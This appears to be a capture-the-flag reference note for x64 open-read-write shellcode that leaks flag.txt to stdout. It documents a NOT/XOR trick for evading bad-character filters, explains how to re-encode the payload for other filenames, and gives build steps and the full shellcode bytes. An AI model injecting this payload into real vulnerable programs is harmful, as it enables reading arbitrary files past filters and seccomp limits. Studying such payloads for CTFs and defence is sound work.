# orw (x64) — bad-char safe

## What it does
Classic open → read → write chain: opens `flag.txt`, reads 100 bytes from it
into a stack buffer, then writes that buffer to stdout.

The twist: the filename `"flag.txt\0"` is never written as a literal
immediate. Instead it's stored bitwise-NOT'd (`0x8b878bd1989e9399`) and
decoded at runtime with `xor rbx, 0xFFFFFFFFFFFFFFFF`. This avoids having
the raw ASCII bytes of `"flag.txt"` show up anywhere in the shellcode —
useful when the challenge blacklists specific bytes and the plain string
would trip the filter (e.g. disassembling the raw immediate shows garbage
like `;Tbins h...` instead of the real filename, confirmed in the decompiled
view before encoding).

## Syscalls used
- `open` (2)
- `read` (0)
- `write` (1)

## When to use it
- `execve` is blocked (seccomp / no shell access), but reading an arbitrary
  file and leaking it to stdout is fine.
- The challenge filters a specific set of bytes (bad chars) and the literal
  filename string, or other immediates, contain one of them — encode with
  NOT/XOR to dodge the filter instead of changing the technique.

## Constraints / bad chars
- Uses the NOT trick (`value XOR 0xFFFFFFFFFFFFFFFF`) specifically because
  the plain-text bytes of `"flag.txt"` (or the registers holding them)
  collided with this challenge's bad-char list. Swap the magic constant
  and the final XOR mask to re-encode for a different filename or a
  different set of forbidden bytes.
- Fixed read/write size of 100 bytes (`dl, 100`) — adjust for larger files.
- Filename is resolved relative to CWD (plain `open`, no `AT_FDCWD` dance
  needed since this isn't `openat`).

## Size
56 bytes

## Build
    nasm -f elf64 orw.asm -o orw.o
    ld orw.o -o orw

## Bytes
    b'\x45\x31\xdb\x44\x89\xd8\x48\xbb\x99\x93\x9e\x98\xd1\x8b\x87\x8b\x48\x83\xf3\xff\x50\x53\x48\x89\xe7\x89\xc6\x89\xc2\xb0\x02\x0f\x05\x48\x89\xc7\x45\x31\xdb\x44\x89\xd8\x48\x89\xe6\xb2\x64\x0f\x05\x40\xb7\x01\xb0\x01\x0f\x05'
